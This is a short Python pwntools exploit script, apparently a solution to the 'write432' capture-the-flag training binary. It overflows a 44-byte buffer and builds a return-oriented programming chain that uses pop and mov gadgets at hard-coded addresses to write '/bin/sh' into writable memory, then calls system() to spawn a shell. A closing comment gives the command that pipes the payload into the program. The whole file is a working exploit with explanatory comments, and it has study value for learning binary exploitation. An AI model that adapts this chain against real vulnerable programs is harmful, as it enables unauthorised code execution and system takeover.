from pwn import *

payload = "A" * 44 ##buffer

write_to = p32(0x804a030) ##empty space for writing /bin/sh

system = p32(0x8048430) ##system address

write = p32(0x08048670)

###First we have to write the string /bin/sh in memory and later call system on the string.
### 1) use mov instruction to write somewhere in memory but this needs our values to be packed inside registers
### so we have to first manipulate registers and then write to location.
### 2) use system with our strings to spawn a shell

### gadgets for moving values to registers

### EBP == string

### EDI == Location in memory

### Gadget to pop values : pop edi; pop ebp; ret;
### Location of gadget : 0x080486da

payload += p32(0x080486da) ## redirecting flow to popping data into registers

payload += write_to ## empty space

payload += "/bin" ##string

### Gadget for moving data from registers to memory location:
### 0x08048670  DWORD PTR [edi],ebp

payload += write ## writing data

### Second write

payload += p32(0x080486da) ## popping values from stack

payload += p32(0x804a030+4) ## next 4 bytes

payload += "/sh\x00" ## making it align 

payload += write ## writing data

### calling system with our strings

payload += system

payload += "AAAA"

payload += write_to

print payload

## (python exploit.py;cat)| ./write432

